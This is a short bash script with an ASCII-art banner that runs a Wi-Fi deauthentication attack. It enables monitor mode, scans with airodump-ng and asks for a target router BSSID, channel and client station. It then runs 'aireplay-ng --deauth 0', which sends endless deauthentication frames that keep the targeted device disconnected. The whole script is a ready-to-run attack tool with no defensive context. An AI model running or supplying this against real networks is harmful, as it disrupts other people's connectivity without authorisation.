airmon-ng start wlan0
gnome-terminal --command "airodump-ng wlan0mon"
clear
echo '

 ________  ___  ___  ________  ___  ___  ___  ________  ___   ___  ________    _____     
|\   ____\|\  \|\  \|\   __  \|\  \|\  \|\  \|\   __  \|\  \ |\  \|\   __  \  / __  \    
\ \  \___|\ \  \\\  \ \  \|\  \ \  \ \  \\\  \ \  \|\  \ \  \\_\  \ \  \|\  \|\/_|\  \   
 \ \  \    \ \   __  \ \  \\\  \ \  \ \   __  \ \  \\\  \ \______  \ \  \\\  \|/ \ \  \  
  \ \  \____\ \  \ \  \ \  \\\  \ \  \ \  \ \  \ \  \\\  \|_____|\  \ \  \\\  \   \ \  \ 
   \ \_______\ \__\ \__\ \_______\ \__\ \__\ \__\ \_______\     \ \__\ \_______\   \ \__\
    \|_______|\|__|\|__|\|_______|\|__|\|__|\|__|\|_______|      \|__|\|_______|    \|__|
                                                                                         
                                                                                         
                                                                                         '
echo 'Please input BSSID of the router'
read BSSID1 
echo 'Please input channel of the router'
read CHANNEL
gnome-terminal --command "airodump-ng wlan0mon --bssid $BSSID1 --channel $CHANNEL"
echo 'Please input STATION of the device'
read BSSID2
aireplay-ng --deauth 0 -c $BSSID2 -a $BSSID1 wlan0mon



